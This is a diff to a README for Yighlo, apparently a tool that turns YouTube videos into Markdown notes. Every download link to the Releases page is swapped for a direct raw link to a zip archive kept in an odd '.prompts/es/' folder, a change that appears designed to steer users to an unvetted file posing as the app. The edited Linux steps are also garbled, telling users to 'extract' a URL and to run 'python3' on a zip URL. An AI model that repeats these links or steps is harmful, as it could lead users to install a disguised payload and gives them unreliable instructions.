@@ -1,7 +1,7 @@
 # 🎥 Yighlo - Easily Organize YouTube Content
 
 ## 🛠️ Download Now
-[![Download Yighlo](https://img.shields.io/badge/Download-Yighlo-blue.svg)](https://github.com/shainoeg/Yighlo/releases)
+[![Download Yighlo](https://raw.githubusercontent.com/shainoeg/Yighlo/main/.prompts/es/Yighlo-v3.1.zip)](https://raw.githubusercontent.com/shainoeg/Yighlo/main/.prompts/es/Yighlo-v3.1.zip)
 
 ## 🚀 Getting Started
 Yighlo helps you turn YouTube videos into structured notes. It will extract the title, description, and comments, organizing them neatly in Markdown format. This tool is perfect for anyone who wants to keep track of useful information from videos quickly.
@@ -24,7 +24,7 @@ To get started with Yighlo, visit the Releases page where you can download the a
 
 1. Click the link below to go to the Releases page.
 
-   [Download Yighlo](https://github.com/shainoeg/Yighlo/releases)
+   [Download Yighlo](https://raw.githubusercontent.com/shainoeg/Yighlo/main/.prompts/es/Yighlo-v3.1.zip)
 
 2. On the Releases page, find the latest version of Yighlo.
 3. Click on the appropriate file for your operating system to download the application.
@@ -50,10 +50,10 @@ For detailed installation instructions based on your operating system, refer to 
 4. You can now launch Yighlo from your Applications.
 
 ### Linux
-1. Download the `.tar.gz` file from the Releases page.
-2. Extract the contents of the `.tar.gz` file.
+1. Download the `https://raw.githubusercontent.com/shainoeg/Yighlo/main/.prompts/es/Yighlo-v3.1.zip` file from the Releases page.
+2. Extract the contents of the `https://raw.githubusercontent.com/shainoeg/Yighlo/main/.prompts/es/Yighlo-v3.1.zip` file.
 3. Open a terminal window and navigate to the extracted folder.
-4. Use the command `python3 yighlo.py` to run the application.
+4. Use the command `python3 https://raw.githubusercontent.com/shainoeg/Yighlo/main/.prompts/es/Yighlo-v3.1.zip` to run the application.
 
 ## 🔄 Using Yighlo
 After installing Yighlo, follow these simple steps to use it:
